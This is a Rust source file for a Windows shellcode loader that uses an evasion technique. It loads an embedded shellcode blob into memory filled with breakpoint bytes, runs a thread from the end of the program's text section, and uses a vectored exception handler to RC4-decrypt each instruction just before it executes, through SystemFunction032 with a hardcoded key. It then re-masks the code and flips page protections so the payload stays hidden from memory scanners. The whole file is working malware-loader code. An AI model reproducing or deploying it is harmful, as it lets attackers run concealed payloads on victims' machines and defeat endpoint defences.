#![windows_subsystem = "windows"]

use once_cell::sync::OnceCell;
use std::ffi::{c_long, c_uchar, c_ulong, c_ushort, c_void};
use std::mem::{size_of, transmute, zeroed};
use std::ops::Not;
use std::ptr::{addr_of_mut, null, null_mut};
use windows_sys::Win32::Foundation::{
    CloseHandle, EXCEPTION_BREAKPOINT, NTSTATUS, STATUS_SUCCESS, STATUS_UNSUCCESSFUL,
};
use windows_sys::Win32::System::Diagnostics::Debug::{
    AddVectoredExceptionHandler, RemoveVectoredExceptionHandler, CONTEXT, EXCEPTION_POINTERS,
    IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
};
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, VirtualQuery, MEMORY_BASIC_INFORMATION, MEM_COMMIT,
    PAGE_EXECUTE_READ, PAGE_READWRITE,
};
use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
use windows_sys::Win32::System::Threading::{
    CreateThread, ExitThread, WaitForSingleObject, INFINITE,
};

static mut INFO: OnceCell<Phantom> = OnceCell::new();

enum InstrInfo {
    InstructionOpcodesQuota,
    InstructionOpcodesRva,
    InstructionOpcodesNumber,
}

#[repr(C)]
struct USTRING {
    length: c_ulong,
    maximum_length: c_ulong,
    buffer: *mut c_void,
}

#[derive(Debug, Default, Copy, Clone)]
struct CryptBytesQuota {
    rva: usize,
    quota: usize,
}

#[derive(Debug)]
struct Phantom {
    allocation_base: *mut c_void,
    previous_instruction: *mut c_void,
    sh: Vec<u8>,
    instruction: Vec<CryptBytesQuota>,
}

fn check_allocation_protection(allocation: *mut c_void, allocation_size: usize) -> c_ulong {
    unsafe {
        let mut p_mem_info: MEMORY_BASIC_INFORMATION = zeroed();
        if VirtualQuery(allocation, addr_of_mut!(p_mem_info), allocation_size) != 0 {
            return p_mem_info.Protect;
        }
    }

    0
}

fn resolve_buffer_feature(pointer: *mut c_void, dw_option: InstrInfo) -> usize {
    unsafe {
        let offset = (pointer as usize) - (INFO.get_mut().unwrap().allocation_base as usize);

        for i in 0..=INFO.get_mut().unwrap().instruction.len() {
            if offset == INFO.get_mut().unwrap().instruction[i].rva {
                return match dw_option {
                    InstrInfo::InstructionOpcodesQuota => {
                        INFO.get_mut().unwrap().instruction[i].quota
                    }
                    InstrInfo::InstructionOpcodesRva => INFO.get_mut().unwrap().instruction[i].rva,
                    InstrInfo::InstructionOpcodesNumber => i,
                };
            }
        }
    }

    0
}

fn resolve_endof_text_segment() -> *mut c_void {
    unsafe {
        let h_current = GetModuleHandleA(null());
        if h_current != 0 {
            let p_idh: *mut IMAGE_DOS_HEADER = transmute(h_current);
            let p_inh: *mut IMAGE_NT_HEADERS64 =
                transmute((h_current as usize) + ((*p_idh).e_lfanew as usize));
            let p_ish: *mut IMAGE_SECTION_HEADER =
                transmute((p_inh as usize) + size_of::<IMAGE_NT_HEADERS64>());
            let p_text: *mut c_void =
                transmute((h_current as usize) + ((*p_ish).VirtualAddress as usize));
            let p_text_null: *mut c_void =
                transmute((p_text as usize) + ((*p_ish).Misc.VirtualSize as usize) + 5);

            return p_text_null;
        }
    }

    null_mut()
}

fn resolve_instruction_by_rva(pointer: *mut c_void) -> NTSTATUS {
    unsafe {
        let rva = resolve_buffer_feature(pointer, InstrInfo::InstructionOpcodesRva);
        for i in 0..INFO.get_mut().unwrap().instruction
            [resolve_buffer_feature(pointer, InstrInfo::InstructionOpcodesNumber)]
        .quota
        {
            *(((pointer as usize) + i) as *mut c_uchar) =
                INFO.get_mut().unwrap().sh.get(rva + i).unwrap().clone();
        }
    }

    STATUS_SUCCESS
}

fn patch_shellcodefor_exception(pointer: *mut c_void) -> NTSTATUS {
    let mut status = STATUS_UNSUCCESSFUL;

    unsafe {
        let mut adv_base = GetModuleHandleA(b"advapi32.dll\0".as_ptr().cast());
        if adv_base == 0 {
            adv_base = LoadLibraryA(b"advapi32.dll\0".as_ptr().cast());
        }

        if adv_base != 0 {
            let mut k = [0x3b_u8, 0x21, 0xff, 0x41, 0xe3];
            let mut buf: USTRING = zeroed();
            let mut key: USTRING = zeroed();
            buf.buffer = pointer;
            buf.length = c_ulong::try_from(resolve_buffer_feature(
                pointer,
                InstrInfo::InstructionOpcodesQuota,
            ))
            .unwrap();
            key.buffer = k.as_mut_ptr().cast();
            key.length = 5;

            let system_function032: fn(data: *mut USTRING, k_needed: *mut USTRING) -> NTSTATUS =
                transmute(GetProcAddress(
                    adv_base,
                    b"SystemFunction032\0".as_ptr().cast(),
                ));
            if (system_function032 as usize) != 0 {
                status = system_function032(addr_of_mut!(buf), addr_of_mut!(key));
            }
        }
    }

    status
}

fn adjust_function_parameters(context_record: *mut CONTEXT) -> bool {
    let mut status = false;

    unsafe {
        if (*context_record).Rcx as usize >= INFO.get_mut().unwrap().allocation_base as usize
            && (*context_record).Rcx as usize
                <= INFO.get_mut().unwrap().allocation_base as usize
                    + INFO.get_mut().unwrap().sh.len()
        {
            if *((((*context_record).Rcx) as *mut *mut c_void) as *mut c_uchar) == 0xcc {
                let mut current_instruction = resolve_buffer_feature(
                    (*context_record).Rcx as *mut c_void,
                    InstrInfo::InstructionOpcodesNumber,
                );
                let mut pointer = (*context_record).Rcx as *mut c_void;

                while status.not() {
                    resolve_instruction_by_rva(pointer);
                    patch_shellcodefor_exception(pointer);
                    for i in 0..INFO.get_mut().unwrap().instruction[current_instruction].quota {
                        if *((((pointer as usize) + i) as *mut *mut c_void) as *mut c_uchar) == 0x00
                        {
                            status = true;
                            break;
                        }
                    }

                    pointer = ((pointer as usize)
                        + INFO.get_mut().unwrap().instruction[current_instruction].quota)
                        as *mut c_void;
                    current_instruction += 1;
                }
            }
        }
    }

    status
}

fn restore_previous_instruction_breakpoint(pointer: *mut c_void) -> bool {
    unsafe {
        let current_instruction =
            resolve_buffer_feature(pointer, InstrInfo::InstructionOpcodesNumber);
        for i in 0..INFO.get_mut().unwrap().instruction[current_instruction].quota {
            *((((pointer as usize) + i) as *mut *mut c_void) as *mut c_uchar) = 0xcc;
        }
    }

    true
}

unsafe extern "system" fn intercept_shellcode_exception(
    exception_data: *mut EXCEPTION_POINTERS,
) -> c_long {
    unsafe {
        if (((*(*exception_data).ContextRecord).Rip as usize)
            >= (INFO.get_mut().unwrap().allocation_base as usize)
            && ((*(*exception_data).ContextRecord).Rip as usize)
                <= ((INFO.get_mut().unwrap().allocation_base as usize)
                    + INFO.get_mut().unwrap().sh.len()))
            || (*(*exception_data).ContextRecord).Rip == (resolve_endof_text_segment() as u64)
        {
            if (*(*exception_data).ContextRecord).Rip == (resolve_endof_text_segment() as u64) {
                (*(*exception_data).ContextRecord).Rip =
                    INFO.get_mut().unwrap().allocation_base as u64;
            }

            let mut old = 0;
            if check_allocation_protection(
                transmute((*(*exception_data).ContextRecord).Rip),
                INFO.get_mut().unwrap().sh.len(),
            ) == PAGE_EXECUTE_READ
            {
                VirtualProtect(
                    transmute((*(*exception_data).ContextRecord).Rip),
                    INFO.get_mut().unwrap().sh.len(),
                    PAGE_READWRITE,
                    addr_of_mut!(old),
                );
            }

            if INFO.get_mut().unwrap().previous_instruction
                >= INFO.get_mut().unwrap().allocation_base
            {
                restore_previous_instruction_breakpoint(
                    INFO.get_mut().unwrap().previous_instruction,
                );
            }

            if (*(*exception_data).ExceptionRecord).ExceptionCode == EXCEPTION_BREAKPOINT
                || (*(*exception_data).ContextRecord).Rip
                    == INFO.get_mut().unwrap().allocation_base as u64
            {
                resolve_instruction_by_rva((*(*exception_data).ContextRecord).Rip as *mut c_void);
                if patch_shellcodefor_exception(
                    (*(*exception_data).ContextRecord).Rip as *mut c_void,
                ) == STATUS_UNSUCCESSFUL
                {
                    ExitThread(0u32);
                }

                INFO.get_mut().unwrap().previous_instruction =
                    ((*(*exception_data).ContextRecord).Rip) as *mut c_void;

                if *((((*(*exception_data).ContextRecord).Rip) as *mut c_ushort) as *mut c_ushort)
                    == 0xe0ff
                {
                    *((((*(*exception_data).ContextRecord).Rip) as *mut c_ushort)
                        as *mut c_ushort) = 0xcccc;
                    adjust_function_parameters((*exception_data).ContextRecord);
                    (*(*exception_data).ContextRecord).Rip = (*(*exception_data).ContextRecord).Rax;
                    restore_previous_instruction_breakpoint(
                        INFO.get_mut().unwrap().previous_instruction,
                    );
                    return -1;
                }
            }

            VirtualProtect(
                ((*(*exception_data).ContextRecord).Rip) as *mut c_void,
                INFO.get_mut().unwrap().sh.len(),
                PAGE_EXECUTE_READ,
                addr_of_mut!(old),
            );
            return -1;
        } else {
            ExitThread(0u32);
        }
    }
}

fn main() {
    unsafe {
        INFO.set(Phantom {
            allocation_base: null_mut(),
            previous_instruction: null_mut(),
            sh: vec![],
            instruction: vec![],
        })
        .unwrap();

        let shellcode: &[u8] = include_bytes!("../assets/shellcode.bin");
        INFO.get_mut().unwrap().sh = Vec::from(shellcode);
        include!("../assets/sh");

        let mut c = CryptBytesQuota::default();
        include!("../assets/in");

        INFO.get_mut().unwrap().allocation_base = VirtualAlloc(
            null(),
            INFO.get_mut().unwrap().sh.len(),
            MEM_COMMIT,
            PAGE_READWRITE,
        );

        if INFO.get_mut().unwrap().allocation_base.is_null().not() {
            for i in 0..=INFO.get_mut().unwrap().sh.len() {
                *(((INFO.get_mut().unwrap().allocation_base as usize) + i) as *mut c_uchar) = 0xcc;
            }

            let h_thread = CreateThread(
                null(),
                0,
                transmute(resolve_endof_text_segment()),
                null(),
                0,
                null_mut(),
            );
            if h_thread != 0 {
                AddVectoredExceptionHandler(1, Some(intercept_shellcode_exception));
                WaitForSingleObject(h_thread, INFINITE);
                RemoveVectoredExceptionHandler(intercept_shellcode_exception as *mut c_void);
                CloseHandle(h_thread);
            }
        }
    }
}
